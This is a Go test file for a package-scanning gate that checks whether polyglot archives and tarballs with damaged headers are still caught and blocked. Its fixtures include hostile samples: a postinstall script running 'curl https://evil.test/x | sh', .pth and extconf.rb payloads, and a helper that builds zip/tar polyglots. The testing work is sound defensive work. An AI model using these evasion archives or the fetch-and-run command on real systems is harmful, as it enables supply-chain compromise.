package llmpkgscan

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"strings"
	"testing"

	"github.com/blechschmidt/pullthrough-security/internal/contentscan"
	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
)

// The gate judges what an installer will unpack. These tests cover the files
// built so that the scanner and the installer disagree about what that is: a
// file that is two archives at once, and a tarball with a damaged header. In
// each, the payload sits where only one reading finds it — and the verdict must
// be reached on that reading too. (The unpacker's own tests are in
// internal/contentscan/polyglot_test.go.)

// A tarball with a zip appended is a tarball to npm and a wheel to pip: a zip
// reader starts at the end of the file. The model is shown both.
func TestFileThatIsTwoArchivesIsJudgedOnBothReadings(t *testing.T) {
	benignTarball := pkgscantest.TarGz(map[string]string{
		"pkg-1.0/setup.py": "from setuptools import setup\nsetup(name='pkg')\n",
		"pkg-1.0/PKG-INFO": "Name: pkg\n",
	})
	hiddenWheel := pkgscantest.Zip(map[string]string{
		"pkg/__init__.py":            "VERSION = '1.0'\n",
		"pkg.pth":                    marked("import os; os.system('id')"),
		"pkg-1.0.dist-info/METADATA": "Name: pkg\n",
	})
	artifact := append(append([]byte(nil), benignTarball...), hiddenWheel...)

	p := &pkgscantest.Provider{}
	svc := newService(t, p, nil)
	// Served as a wheel: pip opens it as a zip. Its first bytes say tar.gz.
	rep := assess(t, svc, payloadRequest(artifact, "pip", "pkg-1.0-py3-none-any.whl"))
	if !rep.Scanned() {
		t.Fatalf("no verdict: %+v", rep.Unscanned)
	}
	v := rep.Verdict
	if rep.Disposition != DispositionMalicious {
		t.Fatalf("disposition = %s: the reading pip installs was not judged.\n%s", rep.Disposition, p.LastMaterial())
	}
	want := contentscan.ZipReadingPrefix + "pkg.pth"
	if len(v.Evidence) == 0 || v.Evidence[0].Path != want || !v.Evidence[0].Verified {
		t.Errorf("evidence = %+v, want a verified citation of %s", v.Evidence, want)
	}
	if !strings.Contains(strings.Join(v.Anomalies, " "), "two archives at once") {
		t.Errorf("anomalies = %v, want the double reading stated", v.Anomalies)
	}
	// Both readings are in front of the model.
	material := p.LastMaterial()
	for _, name := range []string{"pkg-1.0/setup.py", contentscan.ZipReadingPrefix + "pkg/__init__.py"} {
		if !strings.Contains(material, name) {
			t.Errorf("the model was not shown %s", name)
		}
	}

	// The tarball alone, and the wheel alone, are unremarkable or judged as usual.
	clean := assess(t, svc, payloadRequest(benignTarball, "pip", "pkg-1.0.tar.gz"))
	if clean.Disposition != DispositionBenign || len(clean.Verdict.Anomalies) != 0 {
		t.Errorf("the tarball alone: %s, anomalies %v", clean.Disposition, clean.Verdict.Anomalies)
	}
}

// When the second reading cannot be examined — the artifact is too large to
// keep for a second pass and its stream offers no random access — a clean
// verdict on the first reading is not accepted. With random access, as a cache
// entry offers it, the same file is examined in full.
func TestUnexaminedSecondReadingIsNotCleared(t *testing.T) {
	big := plainTar(
		layerFile{name: "pkg/index.js", data: "module.exports = 1;\n"},
		layerFile{name: "pkg/blob.bin", data: pseudoRandom(17 << 20)},
	)
	hidden := pkgscantest.Zip(map[string]string{"pkg.pth": marked("import os; os.system('id')")})
	artifact := append(big, hidden...)

	t.Run("no random access", func(t *testing.T) {
		p := &pkgscantest.Provider{}
		svc := newService(t, p, func(c *Config) { c.Action = ActionQuarantine })
		rep := assess(t, svc, payloadRequest(artifact, "pip", "pkg-1.0-py3-none-any.whl"))
		if !rep.Scanned() {
			t.Fatalf("no verdict: %+v", rep.Unscanned)
		}
		if rep.Verdict.Verdict != VerdictBenign {
			t.Fatalf("the model judged %s; it should have seen only the unremarkable tar", rep.Verdict.Verdict)
		}
		if !rep.Verdict.StructuralRisk || rep.Disposition != DispositionSuspicious || svc.Gate(rep).Served() {
			t.Fatalf("structural risk %v, disposition %s: an artifact whose zip reading nobody examined was cleared", rep.Verdict.StructuralRisk, rep.Disposition)
		}
		if !rep.Verdict.Truncated || !strings.Contains(strings.Join(rep.Verdict.Coverage, " "), "ends like a zip archive") {
			t.Errorf("coverage = %v, want the unexamined reading stated", rep.Verdict.Coverage)
		}
	})

	t.Run("random access", func(t *testing.T) {
		p := &pkgscantest.Provider{}
		svc := newService(t, p, nil)
		req := payloadRequest(artifact, "pip", "pkg-1.0-py3-none-any.whl")
		req.Open = readerAtOpener(artifact)
		rep := assess(t, svc, req)
		if !rep.Scanned() || rep.Disposition != DispositionMalicious {
			t.Fatalf("report = %+v / %+v, want the zip reading found and judged malicious", rep.Verdict, rep.Unscanned)
		}
		if got := rep.Verdict.Evidence[0].Path; got != contentscan.ZipReadingPrefix+"pkg.pth" {
			t.Errorf("evidence at %q", got)
		}
		// The second look did not disturb the stream the verdict is bound to.
		if rep.Verdict.Digest != pkgscantest.Digest(artifact) {
			t.Errorf("verdict digest = %s, want the artifact's %s", rep.Verdict.Digest, pkgscantest.Digest(artifact))
		}
	})
}

// zipAlsoTar builds a file whose first block is at once a zip local header and
// a tar header with a valid checksum (see the unpacker's tests for the layout).
// A zip reader sees one member holding zipData; a tar extractor sees the extra
// members as well.
func zipAlsoTar(t *testing.T, zipData string, extra ...layerFile) []byte {
	t.Helper()
	file := plainTar(append([]layerFile{{name: "placeholder", data: zipData}}, extra...)...)
	block := file[:512]
	const nameLen = 512 - 30
	crc := crc32.ChecksumIEEE([]byte(zipData))
	local := make([]byte, 30)
	copy(local, "PK\x03\x04")
	binary.LittleEndian.PutUint16(local[4:], 20)
	binary.LittleEndian.PutUint32(local[14:], crc)
	binary.LittleEndian.PutUint32(local[18:], uint32(len(zipData)))
	binary.LittleEndian.PutUint32(local[22:], uint32(len(zipData)))
	binary.LittleEndian.PutUint16(local[26:], nameLen)
	copy(block, local)
	for i := 30; i < 100; i++ {
		block[i] = 0
	}
	copy(block[148:156], "        ")
	sum := 0
	for _, c := range block {
		sum += int(c)
	}
	copy(block[148:156], fmt.Sprintf("%06o\x00 ", sum))

	var cd bytes.Buffer
	cd.WriteString("PK\x01\x02")
	_ = binary.Write(&cd, binary.LittleEndian, []uint16{20, 20, 0, 0, 0, 0})
	_ = binary.Write(&cd, binary.LittleEndian, []uint32{crc, uint32(len(zipData)), uint32(len(zipData))})
	_ = binary.Write(&cd, binary.LittleEndian, []uint16{nameLen, 0, 0, 0, 0})
	_ = binary.Write(&cd, binary.LittleEndian, []uint32{0, 0})
	cd.Write(block[30:512])
	out := append([]byte(nil), file...)
	cdOffset := len(out)
	out = append(out, cd.Bytes()...)
	var eocd bytes.Buffer
	eocd.WriteString("PK\x05\x06")
	_ = binary.Write(&eocd, binary.LittleEndian, []uint16{0, 0, 1, 1})
	_ = binary.Write(&eocd, binary.LittleEndian, []uint32{uint32(cd.Len()), uint32(cdOffset)})
	_ = binary.Write(&eocd, binary.LittleEndian, uint16(0))
	return append(out, eocd.Bytes()...)
}

// The other direction: a zip whose first block is a valid tar header. RubyGems,
// Hex and a container runtime read a file from its first byte as a tar and
// unpack members no zip directory lists. Such a file was built to be read two
// ways: the payload is found, and even were it not, the file is not cleared.
func TestZipThatIsAlsoATarIsJudgedAndNeverCleared(t *testing.T) {
	t.Run("payload in the tar reading", func(t *testing.T) {
		artifact := zipAlsoTar(t, "harmless content\n",
			layerFile{name: "ext/extconf.rb", data: marked("system('id')")},
			layerFile{name: "lib/evil.rb", data: "module Evil; end\n"})
		p := &pkgscantest.Provider{}
		svc := newService(t, p, nil)
		rep := assess(t, svc, payloadRequest(artifact, "rubygems", "evil-1.0.0.gem"))
		if !rep.Scanned() || rep.Disposition != DispositionMalicious {
			t.Fatalf("report = %+v / %+v: the members only a tar extractor unpacks were not judged.\n%s", rep.Verdict, rep.Unscanned, p.LastMaterial())
		}
		if got := rep.Verdict.Evidence[0].Path; got != contentscan.TarReadingPrefix+"ext/extconf.rb" {
			t.Errorf("evidence at %q, want it under %s", got, contentscan.TarReadingPrefix)
		}
		if !rep.Verdict.StructuralRisk {
			t.Error("a zip that is also a tar is not flagged as structurally hostile")
		}
	})

	t.Run("nothing found in either reading", func(t *testing.T) {
		artifact := zipAlsoTar(t, "harmless content\n", layerFile{name: "lib/quiet.rb", data: "module Quiet; end\n"})
		svc := newService(t, &pkgscantest.Provider{}, func(c *Config) { c.Action = ActionQuarantine })
		rep := assess(t, svc, payloadRequest(artifact, "rubygems", "quiet-1.0.0.gem"))
		if !rep.Scanned() || rep.Verdict.Verdict != VerdictBenign {
			t.Fatalf("report = %+v / %+v, want a benign model verdict", rep.Verdict, rep.Unscanned)
		}
		if rep.Disposition != DispositionSuspicious || svc.Gate(rep).Served() {
			t.Errorf("disposition = %s: a file built to be two archives was cleared because the model found its contents unremarkable", rep.Disposition)
		}
		found := false
		for _, f := range rep.Findings {
			found = found || f.Category == CategoryArchiveAnomaly
		}
		if !found {
			t.Errorf("findings = %+v, want an archive-anomaly finding", rep.Findings)
		}
	})
}

// npm's extractor skips a header block that fails its checksum and installs
// what follows. A lifecycle script placed behind a deliberately damaged header
// must be read by the model — a "suspicious, structure damaged" verdict that
// still serves the package under the default action is not enough.
func TestMemberBehindADamagedTarHeaderIsJudged(t *testing.T) {
	tarball := plainTar(
		layerFile{name: "package/index.js", data: "module.exports = 1;\n"},
		layerFile{name: "package/decoy.txt", data: "decoy\n"},
		layerFile{name: "package/scripts/setup.js", data: marked("require('child_process').exec('curl https://evil.test/x | sh');")},
		layerFile{name: "package/package.json", data: `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"node scripts/setup.js"}}` + "\n"},
	)
	// Each member is one header block and one data block: break the header of
	// the second member, the one in front of the payload.
	damaged := append([]byte(nil), tarball...)
	damaged[1024] ^= 0x20
	artifact := []byte(gz(damaged))

	p := &pkgscantest.Provider{}
	svc := newService(t, p, nil) // the default action: block malicious, serve suspicious
	rep := assess(t, svc, payloadRequest(artifact, "npm", "evil-1.0.0.tgz"))
	if !rep.Scanned() {
		t.Fatalf("no verdict: %+v", rep.Unscanned)
	}
	if rep.Disposition != DispositionMalicious || svc.Gate(rep).Served() {
		t.Fatalf("disposition = %s, served = %v: the script behind the damaged header was not judged.\n%s",
			rep.Disposition, svc.Gate(rep).Served(), p.LastMaterial())
	}
	if got := rep.Verdict.Evidence[0].Path; got != "package/scripts/setup.js" {
		t.Errorf("evidence at %q", got)
	}
	if !rep.Verdict.StructuralRisk || !rep.Verdict.Truncated {
		t.Errorf("structural risk %v, truncated %v: the damage itself must be on the verdict", rep.Verdict.StructuralRisk, rep.Verdict.Truncated)
	}
	// The package manifest behind the damage is ranked as a manifest: the model
	// reads the postinstall hook, not just a list of names.
	if !strings.Contains(p.LastMaterial(), `"postinstall":"node scripts/setup.js"`) {
		t.Error("package.json, behind the damaged header, was not shown to the model")
	}
}
